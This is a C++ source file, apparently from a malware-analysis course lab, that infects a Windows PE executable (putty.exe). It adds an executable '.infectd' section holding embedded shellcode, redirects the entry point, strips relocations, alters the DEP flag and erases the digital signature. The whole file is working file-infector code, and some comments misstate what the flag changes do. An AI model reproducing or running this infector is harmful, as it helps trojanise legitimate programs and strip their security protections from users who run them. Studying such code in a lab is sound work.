// PE_Infection.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <windows.h>
#include <fstream>
#include <future>
#include <string>
#include <memory>
#include "PE.h"

using namespace std;

//Since the address size is always the same, use a macro to define it.
#define ADDRESS_SIZE 4

size_t alignUp(size_t size, size_t alignment) {
    //Remainder Is the portion of size that is not multiple of alignment (without this portion size would be aligned)
    auto remainder = size % alignment;
    if (remainder != 0) {
        //The alignment-remainder are the number of elements that size needs in order to be algined with alignment
        size += alignment - remainder;
    }
    return size;
}

void infectPEHeader(char* PE_file, size_t PE_size, char* outputFile, char* shellcode, size_t shellcode_size) {
    /* Parse the PE File*/
    auto Parsed_PE = PE::ParsePE(PE_file);
    MessageBoxA(NULL, (LPCSTR)"PE File Parsed", (LPCSTR)"INFO", MB_ICONWARNING);

    /* Obtain AddressOfEntryPoint */
    /**
     * AddressOfEntryPoint is inside the OptionalHeaders of the ImageHeaders
     * AdressOfEntryPoint is relative to the Image base.
     * The ImageBase is a value also inside the OptionalHeaders of Image Headers.
     * The Image Headers in my struct are the inh32.
    */
    auto ImageBase = Parsed_PE.inh32.OptionalHeader.ImageBase;
    auto offsetEP = Parsed_PE.inh32.OptionalHeader.AddressOfEntryPoint;
    auto AOEP = ImageBase + offsetEP;

    /* Craft the shellcode of the Jump */
    /**
     * Remember that the address must go in little endian (so when pushed is in abolsute value) Bc addresses are stored in little endian!
     * When computing the size we must substract 3 becasue of the null-termination character that sizeof counts.
     * We may have used strlen to compute it but I am not sure it would've worked
    */
    char shellcode_push[] = "\x68";         //push
    char shellcode_jmp[] = "\xff\x24\x24";  //jmp [esp]
    char shellcode_AOEP[] = { AOEP >> 0 & 0xFF, AOEP >> 8 & 0xFF, AOEP >> 16 & 0xFF, AOEP >> 24 & 0xFF };
    //Instead of using strlen(shellcode_AOEP)+1 or sizeof(shellcode_AOEP) we use a constant because if using strlen()+1 would fail if the address had no 00 and the same if using sizeof() instead of sizeof()-1
    //As the address size is always constant we use a constant define.
    size_t injection_size = shellcode_size + strlen(shellcode_push) + ADDRESS_SIZE + strlen(shellcode_jmp);
    //cout << "Size of Shellcode Push, AOEP and JMP with strlen:\n" << strlen(shellcode_push) << ' ' << strlen(shellcode_AOEP) << ' ' << strlen(shellcode_jmp) << '\n';
    //cout << "Size of Shellcode Push, AOEP and JMP with sizeof:\n" << sizeof(shellcode_push) << ' ' << sizeof(shellcode_AOEP) << ' ' << sizeof(shellcode_jmp) << '\n';

    /* Increment the number of sections */
    //The number of sections is inside the FileHeader (of the ImageHeaders)
    auto number_of_sections = ++Parsed_PE.inh32.FileHeader.NumberOfSections;

    /* Add a new Image Section Header */
    auto new_section_index = number_of_sections - 1; //Position of the new header.
    vector<IMAGE_SECTION_HEADER> new_ish(number_of_sections+1); //It seems there is a null entry at the end of the ish so we mantain that entry by reserving 1 more.

    /* Copy all existing Image Section headers to new ISH */
    for (int i = 0; i < number_of_sections - 1; i++) {
        new_ish[i] = Parsed_PE.ish[i];
    }

    /* Overwrite original ISH with the new one */
    Parsed_PE.ish = new_ish;

    /* Construct the new header section */
    /**
     * Header Format:
     *  name
     *	VirtualAddress --> Offset to ImageBase. Can be computed using VirtualAddress and VirtualSize of previous entry.
     *                          Remember It must be aligned to OptionalHeaders.SectionAlignment
     *  misc
     *	    VirtualSize --> this is the size of our section (shellcode)
     *	SizeOfRawData --> Size of the data in disk, must be multiple of multiple of FileAlignment from the optional header
     *	PointerToRawData --> Pointer to the data of the disk. Computed from previous section Pointer and size (As size is aligned we do not need to align before adding) C
     *	PointerToRealocations --> 0
     *	PointerToLinenumbers --> 0
     *	NumberOfRealocations --> 0
     *	NumberOfLinenumbers --> 0
     *	Characteristics --> IMAGE_SCN_CNT_CODE, IMAGE_SCN_MEM_EXECUTE, IMAGE_SCN_MEM_READ
     *
    */
    memcpy(Parsed_PE.ish[new_section_index].Name, ".infectd", 8);

    //Align it to page Size, usually 4KB (4096 Bytes)
    Parsed_PE.ish[new_section_index].VirtualAddress = Parsed_PE.ish[new_section_index - 1].VirtualAddress
        + alignUp(Parsed_PE.ish[new_section_index - 1].Misc.VirtualSize, Parsed_PE.inh32.OptionalHeader.SectionAlignment);

    Parsed_PE.ish[new_section_index].Misc.VirtualSize = injection_size;

    //As Size is already aligned, we do not need to align it here in the operation and can use directly the previous ones
    Parsed_PE.ish[new_section_index].PointerToRawData = Parsed_PE.ish[new_section_index - 1].PointerToRawData + Parsed_PE.ish[new_section_index - 1].SizeOfRawData;
    //Aligned to file (multiple of file Alignment). Usually 200
    Parsed_PE.ish[new_section_index].SizeOfRawData = alignUp(injection_size, Parsed_PE.inh32.OptionalHeader.FileAlignment);

    Parsed_PE.ish[new_section_index].Characteristics = IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ;

    /* Update the Values of the PE Header */
    /**
    * Here we need to update the values of the other Headers:
    *   SizeOfImage --> Size of whole PE File Struct aligned to SectionAlignment. As sections are the last part of PE File Structure, is VirtualAddress of last section + VirtualSize
    *   AddressOfEntryPoint --> VirtualAddress of our section
    */
    Parsed_PE.inh32.OptionalHeader.SizeOfImage = Parsed_PE.ish[new_section_index].VirtualAddress 
        + alignUp(Parsed_PE.ish[new_section_index].SizeOfRawData, Parsed_PE.inh32.OptionalHeader.SectionAlignment);

    Parsed_PE.inh32.OptionalHeader.AddressOfEntryPoint = Parsed_PE.ish[new_section_index].VirtualAddress;

    /* Inject the code to the new section */
    /**
    * All the sections are in a vector called Sections of type shared_ptr<char*>
    * We create a new object.
    * We update the object
    * We push the object to the vector.
    */
    //Create New shared pointer with size SizeOfRawData (already aligned)
    size_t sizeOfNewSection = Parsed_PE.ish[new_section_index].SizeOfRawData;
    shared_ptr<char> new_section(new char[sizeOfNewSection] {}, default_delete<char[]>());

    //Get pointer to the section 
    auto section_content = new_section.get();
    //Copy contents to the section
    memcpy(section_content, shellcode, shellcode_size);
    memcpy(section_content + shellcode_size, shellcode_push, strlen(shellcode_push));
    //Using Address size explained when computing injection_size
    memcpy(section_content + shellcode_size + strlen(shellcode_push), shellcode_AOEP, ADDRESS_SIZE);
    memcpy(section_content + shellcode_size + strlen(shellcode_push) + ADDRESS_SIZE, shellcode_jmp, strlen(shellcode_jmp));

    //Add new section to vector
    Parsed_PE.Sections.push_back(new_section);

    /* Disable ASLR */
    Parsed_PE.inh32.OptionalHeader.DllCharacteristics |= IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE;
    // Reset DataDirectory Realocation Table
    Parsed_PE.inh32.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size = { 0 };
    Parsed_PE.inh32.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress = { 0 };
    
    Parsed_PE.inh32.FileHeader.Characteristics |= IMAGE_FILE_RELOCS_STRIPPED;

    /* Disable DEP */
    Parsed_PE.inh32.OptionalHeader.DllCharacteristics ^= IMAGE_DLLCHARACTERISTICS_NX_COMPAT;

    /* Erase digital Signature */
    Parsed_PE.inh32.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].Size = { 0 };
    Parsed_PE.inh32.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].VirtualAddress = { 0 };

    /* Write back to exe file */
    auto newPEsize = PE_size + sizeOfNewSection;
    PE::WriteBinary(Parsed_PE, outputFile, newPEsize);
}


int main()
{
    std::cout << "Hello World!\n";
    char file_to_infect[] = "C:\\Users\\Pablo\\Desktop\\UNI\\Asignaturas\\Master\\MALW\\Lab\\PEFileInfection\\PE_Infection\\putty.exe";
    //Name for the file with shellcode being null (Debug Purposes)
    //char outputFile[] = "C:\\Users\\Pablo\\Desktop\\UNI\\Asignaturas\\Master\\MALW\\Lab\\PEFileInfection\\PE_Infection\\putty_inf_void.exe";
    char outputFile[] = "C:\\Users\\Pablo\\Desktop\\UNI\\Asignaturas\\Master\\MALW\\Lab\\PEFileInfection\\PE_Infection\\putty_inf.exe";
    
    //Internet OpenMsgBoxA
    //char shellcode[] = "\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42\x08\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b\x34\xaf\x01\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e\x08\x45\x78\x69\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x79\x74\x65\x01\x68\x6b\x65\x6e\x42\x68\x20\x42\x72\x6f\x89\xe1\xfe\x49\x0b\x31\xc0\x51\x50\xff\xd7";
    
    //char shellcode[] = "\x31\xc9\x64\x8b\x41\x30\x8b\x40\xc\x8b\x70\x14\xad\x96\xad\x8b\x58\x10\x8b\x53\x3c\x1\xda\x8b\x52\x78\x1\xda\x8b\x72\x20\x1\xde\x31\xc9\x41\xad\x1\xd8\x81\x38\x47\x65\x74\x50\x75\xf4\x81\x78\x4\x72\x6f\x63\x41\x75\xeb\x81\x78\x8\x64\x64\x72\x65\x75\xe2\x8b\x72\x24\x1\xde\x66\x8b\xc\x4e\x49\x8b\x72\x1c\x1\xde\x8b\x14\x8e\x1\xda\x31\xc9\x53\x52\x51\x68\x61\x72\x79\x41\x68\x4c\x69\x62\x72\x68\x4c\x6f\x61\x64\x54\x53\xff\xd2\x83\xc4\xc\x59\x50\x51\x66\xb9\x6c\x6c\x51\x68\x33\x32\x2e\x64\x68\x75\x73\x65\x72\x54\xff\xd0\x83\xc4\x10\x8b\x54\x24\x4\xb9\x6f\x78\x41\x0\x51\x68\x61\x67\x65\x42\x68\x4d\x65\x73\x73\x54\x50\xff\xd2\x83\xc4\x10\x68\x61\x62\x63\x64\x83\x6c\x24\x3\x64\x89\xe6\x31\xc9\x51\x56\x56\x51\xff\xd0";
    //Null Shellcode
    //char shellcode[] = "\x90";
    char shellcode[] = "\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42"
                        "\x08\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03"
                        "\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b"
                        "\x34\xaf\x01\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e"
                        "\x08\x45\x78\x69\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c"
                        "\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x79\x74"
                        "\x65\x01\x68\x6b\x65\x6e\x42\x68\x20\x42\x72\x6f\x89\xe1\xfe"
                        "\x49\x0b\x31\xc0\x51\x50\xff\xd7";


    tuple<bool, char*, fstream::pos_type> PE_tuple = PE::OpenBinary(file_to_infect);

    cout << "Created Tuple!\n";
    MessageBoxA(NULL, (LPCSTR)"Tuple Created", (LPCSTR)"INFO", MB_ICONWARNING);
    if (!get<0>(PE_tuple)) {
        MessageBoxA(NULL, (LPCSTR)"Tuple ERROR.\n Could not open the file", (LPCSTR)"ERROR", MB_ICONERROR);
        return EXIT_FAILURE;

    }

    char* PE_Filedata = get<1>(PE_tuple);
    size_t PE_size = get<2>(PE_tuple);

    size_t shellcodeSize = strlen(shellcode);

    infectPEHeader(PE_Filedata, PE_size, outputFile, shellcode, shellcodeSize);
}